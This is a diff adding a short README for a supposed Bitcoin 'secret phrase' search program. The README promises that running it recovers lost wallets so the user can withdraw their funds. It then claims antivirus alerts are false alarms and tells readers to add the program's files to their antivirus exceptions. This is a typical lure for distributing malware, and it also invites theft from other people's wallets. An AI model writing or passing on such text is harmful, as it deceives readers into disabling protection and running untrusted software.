@@ -1,0 +1,6 @@
+BTC PROFIT SEARCH AND MINING PHRASES. 
+This program searches for Bitcoin wallets with a balance, and tries to find a secret phrase for them to get full access to the lost wallet!
+All you need to do is run the program, and then go about your business while the program picks up secret phrases for lost wallets, it's not a quick process, but it's worth it. When the secret phrase is found, a Bitcoin wallet with a balance and a secret phrase will appear in the file, and you will be able to use it to enter the wallet and withdraw all the funds available on it!
+
+During the launch of the program, some antiviruses can block important files, that are necessary for the program to work, because we use specific software. This is a false alarm of the antivirus, it sometimes happens, even when running official software, such as (Steam).
+If your antivirus blocks the program, just add these files to the exception of your antivirus!
